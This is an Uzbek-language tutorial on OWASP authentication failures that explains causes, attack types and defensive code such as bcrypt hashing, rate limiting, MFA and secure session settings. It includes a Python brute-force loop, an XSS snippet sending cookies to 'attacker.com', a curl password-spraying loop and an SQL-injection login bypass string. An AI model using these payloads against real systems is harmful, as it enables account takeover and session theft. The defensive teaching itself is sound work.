# Identification & Authentication Failures: Batafsil Tahlil va Himoya Choralari

## 📋 Kirish
**Identification & Authentication Failures** (Identifikatsiya va Autentifikatsiya Xatolari) - bu OWASP Top 10 2021 ro'yxatida 7-o'rinda turgan xavfsizlik zaifligidir. Ilgari bu "Broken Authentication" nomi bilan ma'lum edi.  

Bu zaiflik foydalanuvchi identifikatsiyasi va autentifikatsiya jarayonlarida yuzaga keladigan xatolar natijasida hacker yoki tajovuzkorlar tizimga noqonuniy kirishlari mumkin bo'lgan holatlarni anglatadi.

## 🎯 Asosiy Tushunchalar
- **Identifikatsiya (Identification)**  
  Foydalanuvchining kim ekanligini aniqlash jarayoni. Masalan: login, email, ID.  

- **Autentifikatsiya (Authentication)**  
  Foydalanuvchining haqiqatan ham u aytgan odam ekanligini tasdiqlash jarayoni. Masalan: parol, biometrik ma'lumotlar, token.  

- **Avtorizatsiya (Authorization)**  
  Autentifikatsiya qilingan foydalanuvchining qaysi resurslarga kirish huquqi borligini aniqlash.

## 🔴 Zaiflikning Kelib Chiqish Sabablari
1. **Zaif Parol Siyosati**
   - Oddiy parollarni qabul qilish (123456, password, qwerty)  
   - Parol uzunligi bo'yicha talablarning yo'qligi  
   - Maxsus belgilar talab qilinmasligi  

2. **Credential Stuffing Hujumlariga Qarshi Himoyaning Yo'qligi**
   - Brute-force hujumlarni cheklovchi mexanizmlar yo'q  
   - Rate limiting (so'rovlar cheklovi) amalga oshirilmagan  
   - CAPTCHA yoki boshqa bot-detection vositalar ishlatilmagan  

3. **Session Management Xatolari**
   - Session ID ni URL da uzatish  
   - Session timeout yo'q yoki juda uzoq  
   - Session ID regeneratsiya qilinmasligi  
   - Logout jarayonida session tugallanmasligi  

4. **Parollarni Noto'g'ri Saqlash**
   - Parollarni ochiq (plain text) holatda saqlash  
   - Zaif hash algoritmlarini ishlatish (MD5, SHA1)  
   - Salt ishlatmaslik  

5. **Multi-Factor Authentication (MFA) Yo'qligi**
   - Ikkinchi autentifikatsiya qatlami mavjud emas  
   - Muhim operatsiyalar uchun qo'shimcha tasdiqlash yo'q  

6. **Password Recovery Jarayonidagi Xatolar**
   - "Parolni unutdim" funksiyasi orqali ma'lumot to'plash  
   - Xavfsiz savol-javoblardan foydalanish  
   - Email orqali parolni yuborish  

7. **Session Fixation Zaifliklar**
   - Session ID ni foydalanuvchi login qilgunga qadar o'zgartirilmasligi  
   - Oldindan berilgan session ID ni qabul qilish  

## 💥 Hujum Turlari va Misollar

### 1. Brute Force Attack
**Ta'rif:** Hacker barcha mumkin bo'lgan parol kombinatsiyalarini sinab ko'radi.  

```python
# Oddiy brute force misoli (faqat ta'limiy maqsadda!)
import requests

username = "admin"
passwords = ["123456", "password", "admin", "qwerty"]
url = "https://example.com/login"

for password in passwords:
    response = requests.post(url, data={
        "username": username,
        "password": password
    })
    
    if "Invalid credentials" not in response.text:
        print(f"Parol topildi: {password}")
        break
Himoya: Rate limiting, account lockout, CAPTCHA

2. Credential Stuffing
Ta'rif: Boshqa saytlardan o'g'irlangan username/password kombinatsiyalarini sinash.

Stsenari misoli:

Hacker 100,000 ta login/parol kombinatsiyasini darknet-dan sotib oladi

Ushbu ma'lumotlarni sizning saytingizda sinab ko'radi

Odamlar ko'p saytlarda bir xil parol ishlatganligi uchun ba'zi hisoblar buziladi

Statistika: Credential stuffing hujumlari 2023-yilda 30% ga oshgan.

3. Session Hijacking
Ta'rif: Foydalanuvchining session ID sini o'g'irlab, uning nomidan tizimga kirish.

javascript
Copy code
// XSS orqali session cookie o'g'irlash misoli
<script>
  var sessionId = document.cookie;
  fetch('https://attacker.com/steal?cookie=' + sessionId);
</script>
URL orqali session ID uzatish (NOTO'G'RI):

arduino
Copy code
https://example.com/dashboard?sessionid=abc123xyz
4. Password Spraying
Ta'rif: Ko'p foydalanuvchilarga bir nechta eng keng tarqalgan parollarni sinash.

bash
Copy code
# Misol: 1000 ta foydalanuvchiga "Password123" ni sinash
for user in users.txt; do
  curl -X POST https://example.com/login \
    -d "username=$user&password=Password123"
done
5. Weak Password Recovery
Noto'g'ri misol:

vbnet
Copy code
Savollar:
- Onangizning qizlik familiyasi?
- Birinchi uy hayvoniningiz nomi?
- Tug'ilgan shahringiz?
Bu ma'lumotlarni social engineering yoki social media orqali topish oson.
🛡️ Himoya Choralari
1. Kuchli Parol Siyosati
python
Copy code
import re

def validate_password(password):
    """
    Parol talablari:
    - Kamida 12 ta belgi
    - Katta va kichik harflar
    - Raqamlar
    - Maxsus belgilar
    """
    if len(password) < 12:
        return False, "Parol kamida 12 ta belgidan iborat bo'lishi kerak"
    
    if not re.search(r'[A-Z]', password):
        return False, "Kamida bitta katta harf kerak"
    
    if not re.search(r'[a-z]', password):
        return False, "Kamida bitta kichik harf kerak"
    
    if not re.search(r'[0-9]', password):
        return False, "Kamida bitta raqam kerak"
    
    if not re.search(r'[!@#$%^&*(),.?\":{}|<>]', password):
        return False, "Kamida bitta maxsus belgi kerak"
    
    # Keng tarqalgan parollarni tekshirish
    common_passwords = ["Password123!", "Qwerty123!", "Admin@123"]
    if password in common_passwords:
        return False, "Bu parol juda keng tarqalgan"
    
    return True, "Parol kuchli"

# Test
print(validate_password("weakpass"))  # False
print(validate_password("StrongP@ssw0rd123"))  # True
2. Parollarni Xavfsiz Saqlash
python
Copy code
import bcrypt

def hash_password(password):
    salt = bcrypt.gensalt(rounds=12)
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed

def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode('utf-8'), hashed)
Tavsiya: Argon2id yoki scrypt ham yaxshi tanlovlar.

3. Rate Limiting va Account Lockout
python
Copy code
from flask import Flask, request, jsonify
from datetime import datetime, timedelta
from collections import defaultdict

app = Flask(__name__)
login_attempts = defaultdict(list)
blocked_ips = {}

MAX_ATTEMPTS = 5
BLOCK_DURATION = timedelta(minutes=15)
TIME_WINDOW = timedelta(minutes=5)

@app.route('/login', methods=['POST'])
def login():
    ip_address = request.remote_addr
    current_time = datetime.now()
    # Block tekshirish, login urinishlarini hisoblash ...
4. Multi-Factor Authentication (MFA)
python
Copy code
import pyotp
import qrcode
from io import BytesIO

def setup_mfa(username):
    secret = pyotp.random_base32()
    totp_uri = pyotp.TOTP(secret).provisioning_uri(name=username, issuer_name="MyApp")
    qr = qrcode.make(totp_uri)
    return secret, qr
5. Xavfsiz Session Management
python
Copy code
from flask import Flask, session
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
6. Xavfsiz Password Recovery
python
Copy code
import secrets
from flask import Flask, request, jsonify

reset_tokens = {}
# Token yaratish va yuborish jarayoni
7. CAPTCHA Implementation
python
Copy code
from flask import Flask, request, jsonify
import requests

RECAPTCHA_SECRET_KEY = "your_secret_key_here"

def verify_recaptcha(response):
    payload = {'secret': RECAPTCHA_SECRET_KEY, 'response': response}
    r = requests.post('https://www.google.com/recaptcha/api/siteverify', data=payload)
    result = r.json()
    return result.get('success') and result.get('score', 0) > 0.5
📊 Real-World Misollar
LinkedIn (2012) – 6.5 million parol SHA1 bilan hash qilingan, salt ishlatilmagan. Natija: hackerlar tezda parollarni decrypt qildilar.

Yahoo (2013-2014) – 3 milliard hisob buzildi, zaif autentifikatsiya, MFA yo'q.

Equifax (2017) – 147 million kishi ma'lumotlari o'g'irlandi, Apache Struts zaifligi + zaif authentication.

✅ Best Practices Checklist
Dasturchilar uchun

Parollar faqat bcrypt/Argon2 bilan hash qilish

Kamida 12 belgidan iborat parol talab qilish

MFA ni joriy qilish

Rate limiting va account lockout mexanizmlari

Session ID ni URL da uzatmaslik

Session timeout ni sozlash (15-30 minut)

Login qilganda session ID ni regeneratsiya qilish

HTTPS ni majburiy qilish

HttpOnly va Secure cookie flaglaridan foydalanish

Password reset token larni xavfsiz qilish (30 daqiqalik muddatli)

Brute force hujumlarga qarshi CAPTCHA

Failed login attempts ni log qilish

Parol o'zgartirilganda email xabarnomasi

Keng tarqalgan parollarni rad etish

Tashkilotlar uchun

Password policy ni tuzish va qo'llash

Security awareness training

Regular penetration testing

Incident response plan

Third-party authentication service larni ko'rib chiqish (Auth0, Okta)

🔧 Testing va Vulnerability Scanning
Manual Testing

bash
Copy code
# 1. Zaif parollarni sinash
curl -X POST https://example.com/login -d "username=admin&password=admin"

# 2. SQL Injection orqali authentication bypass
curl -X POST https://example.com/login -d "username=admin' OR '1'='1&password=anything"
Automated Tools

bash
Copy code
# OWASP ZAP
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' https://example.com

# Burp Suite, Nikto
📈 Monitoring va Detection
python
Copy code
import logging
class AuthenticationMonitor:
    def log_failed_attempt(self, username, ip_address):
        self.logger.warning(f"Failed login attempt: {username} from {ip_address}")
🎓 Xulosa
Hech qachon parollarni plain text da saqlamang

MFA ni majburiy qiling

Rate limiting va CAPTCHA dan foydalaning

Session management ni to'g'ri amalga oshiring

Regular security audit va penetration testing o'tkazing

📚 Qo'shimcha Manbalar
OWASP Authentication Cheat Sheet

NIST Digital Identity Guidelines

OWASP Top 10 2021